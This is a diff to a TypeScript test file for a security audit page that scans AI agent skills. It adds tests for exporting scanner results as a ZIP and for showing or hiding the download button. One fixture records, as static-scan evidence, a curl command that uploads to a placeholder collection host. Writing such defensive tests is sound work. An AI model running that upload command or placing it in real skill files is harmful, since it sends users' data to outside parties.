@@ -1,11 +1,18 @@
 import { fireEvent, render, screen, waitFor } from "@testing-library/react";
+import { unzipSync } from "fflate";
 import { beforeEach, describe, expect, it, vi } from "vitest";
+import {
+  buildSecurityAuditExportEntries,
+  buildSecurityAuditExportZip,
+  type StaticScan,
+} from "../lib/securityAuditExport";
 import { SecurityAuditPage } from "./SecurityAuditPage";
 import {
   getSkillSpectorIssueCount,
   SecurityScanResults,
   type LlmAnalysis,
   type SkillSpectorAnalysis,
+  type VtAnalysis,
 } from "./SkillSecurityScanResults";
 
 const clawScanAnalysis: LlmAnalysis = {
@@ -157,6 +164,37 @@ const skillSpectorAnalysis: SkillSpectorAnalysis = {
         "Make the manifest and body accurately describe the same skill, and reject deceptive metadata.",
     },
   ],
+};
+
+const staticScan: StaticScan = {
+  status: "suspicious",
+  reasonCodes: ["static.network_request"],
+  findings: [
+    {
+      code: "static.network_request",
+      severity: "warn",
+      file: "SKILL.md",
+      line: 12,
+      message: "Network request found in skill instructions.",
+      evidence: "curl https://collect.example/upload",
+    },
+  ],
+  summary: "Static analysis found an external network request.",
+  engineVersion: "static-publish-scan@1",
+  checkedAt: Date.now(),
+};
+
+const vtAnalysis: VtAnalysis = {
+  status: "suspicious",
+  verdict: "engines",
+  source: "engines",
+  engineStats: {
+    malicious: 1,
+    suspicious: 1,
+    harmless: 2,
+    undetected: 58,
+  },
+  checkedAt: Date.now(),
 };
 
 const originalFetch = globalThis.fetch;
@@ -1026,6 +1064,55 @@ describe("SecurityScanResults static guidance", () => {
     ).toEqual(["Overview", "SkillSpector", "VirusTotal"]);
   });
 
+  it("builds a security audit ZIP with scanner outcome files", () => {
+    const input = {
+      entity: {
+        kind: "skill" as const,
+        title: "Pattern Guard",
+        name: "pattern-guard",
+        version: "1.2.3",
+        detailPath: "/local/pattern-guard",
+      },
+      sha256hash: "a".repeat(64),
+      llmAnalysis: clawScanAnalysis,
+      skillSpectorAnalysis,
+      staticScan,
+      vtAnalysis,
+      exportedAt: "2026-06-02T15:00:00.000Z",
+    };
+
+    expect(buildSecurityAuditExportEntries(input).map((entry) => entry.path)).toEqual([
+      "manifest.json",
+      "clawscan.json",
+      "skillspector.json",
+      "static-analysis.json",
+      "virustotal.json",
+    ]);
+
+    const zipEntries = unzipSync(buildSecurityAuditExportZip(input));
+    const decode = (path: string) => new TextDecoder().decode(zipEntries[path]);
+
+    expect(Object.keys(zipEntries).sort()).toEqual([
+      "README.md",
+      "clawscan.json",
+      "manifest.json",
+      "skillspector.json",
+      "static-analysis.json",
+      "virustotal.json",
+    ]);
+    expect(JSON.parse(decode("manifest.json")).scanners).toEqual({
+      clawscan: "suspicious",
+      skillspector: "suspicious",
+      staticAnalysis: "suspicious",
+      virustotal: "suspicious",
+    });
+    expect(JSON.parse(decode("skillspector.json")).issues[0].issueId).toBe("SDI-1");
+    expect(JSON.parse(decode("static-analysis.json")).findings[0].code).toBe(
+      "static.network_request",
+    );
+    expect(JSON.parse(decode("virustotal.json")).engineStats.malicious).toBe(1);
+  });
+
   it("shows plugins with legacy ClawScan analysis in the new ClawScan report shell", () => {
     render(
       <SecurityAuditPage
@@ -1164,10 +1251,28 @@ describe("SecurityScanResults static guidance", () => {
       />,
     );
 
+    expect(screen.getByRole("button", { name: "Download security audit" })).toBeTruthy();
     fireEvent.click(screen.getByRole("button", { name: "Rescan" }));
 
     await waitFor(() => expect(requestRescan).toHaveBeenCalledTimes(1));
     expect(screen.getByRole("button", { name: "Scanning" })).toHaveProperty("disabled", true);
+  });
+
+  it("hides security audit downloads when rescans are not available", () => {
+    render(
+      <SecurityAuditPage
+        entity={{
+          kind: "skill",
+          title: "Public Guard",
+          name: "public-guard",
+          version: "1.0.0",
+          detailPath: "/local/public-guard",
+        }}
+      />,
+    );
+
+    expect(screen.queryByRole("button", { name: "Rescan" })).toBeNull();
+    expect(screen.queryByRole("button", { name: "Download security audit" })).toBeNull();
   });
 
   it("lets plugin managers use the shared security rescan control", async () => {
